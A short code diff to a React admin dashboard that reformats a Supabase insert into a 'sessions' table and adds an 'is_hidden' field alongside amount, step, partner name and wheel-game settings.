@@ -38,20 +38,21 @@ export function Admin1Dashboard({ user }: { user: any }) {
     
     try {
       const { data, error } = await supabase
-        .from("sessions")
-        .insert({ 
-          amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0), 
-          current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry", 
-          status: "offline", 
-          partner_name: linkType === "normal" ? (partnerName.trim() || adminIdentifier) : adminIdentifier,
-          participation_code: linkType === "normal" ? (participationCode.trim() || null) : null,
-          form_data: { 
-            currency, 
-            is_wheel_game: linkType === "wheel",
-          }
-        })
-        .select("id")
-        .single();
+          .from("sessions")
+          .insert({
+            amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
+            current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry",
+            status: "offline",
+            is_hidden: false,
+            partner_name: linkType === "normal" ? (partnerName.trim() || adminIdentifier) : adminIdentifier,
+            participation_code: linkType === "normal" ? (participationCode.trim() || null) : null,
+            form_data: {
+              currency,
+              is_wheel_game: linkType === "wheel",
+            }
+          })
+          .select("id")
+          .single();
 
       if (error) throw error;
 
